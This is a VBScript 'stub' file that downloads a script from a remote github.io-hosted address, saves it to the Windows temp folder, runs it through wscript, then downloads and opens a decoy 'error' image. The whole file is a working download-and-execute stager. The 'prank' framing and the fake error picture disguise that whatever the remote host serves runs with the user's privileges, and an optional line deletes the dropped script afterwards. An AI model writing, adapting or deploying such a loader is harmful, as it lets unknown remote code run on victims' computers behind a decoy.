' ============================================
' stub.vbs
' Downloads and runs a remote VBS prank,
' then downloads and displays an image.
' ============================================

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
tempFolder = objFSO.GetSpecialFolder(2)   ' %TEMP%

' ---------- CONFIGURE THESE URLS ----------
remoteVBS_URL = "https://downloads-img.github.io/AGTA/agta.vbs"
remoteImage_URL = "https://downloads-img.github.io/AGTA/error.png"
' ------------------------------------------

' 1. Download the remote prank VBS
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", remoteVBS_URL, False
http.Send
If http.Status <> 200 Then
    MsgBox "Failed to download prank script. HTTP " & http.Status, vbCritical, "Error"
    WScript.Quit
End If

' Save prank to a temp file
vbsTempFile = objFSO.BuildPath(tempFolder, "prank_" & Replace(CStr(Timer), ".", "") & ".vbs")
Set f = objFSO.CreateTextFile(vbsTempFile, True)
f.Write http.responseText
f.Close

' 2. Run the prank VBS and WAIT for it to finish
objShell.Run "wscript.exe " & Chr(34) & vbsTempFile & Chr(34), 1, True

' 3. Download the image (binary safe)
http.Open "GET", remoteImage_URL, False
http.Send
If http.Status = 200 Then
    imageTempFile = objFSO.BuildPath(tempFolder, "image_" & Replace(CStr(Timer), ".", "") & ".jpg")
    
    Dim adoStream
    Set adoStream = CreateObject("ADODB.Stream")
    adoStream.Type = 1          ' adTypeBinary
    adoStream.Open
    adoStream.Write http.responseBody
    adoStream.SaveToFile imageTempFile, 2   ' adSaveCreateOverWrite
    adoStream.Close
    
    ' 4. Display the image in the default viewer
    objShell.Run Chr(34) & imageTempFile & Chr(34), 1, False
Else
    MsgBox "Failed to download image. HTTP " & http.Status, vbExclamation, "Error"
End If

' Optional: delete the temporary prank VBS after running
' objFSO.DeleteFile vbsTempFile, True
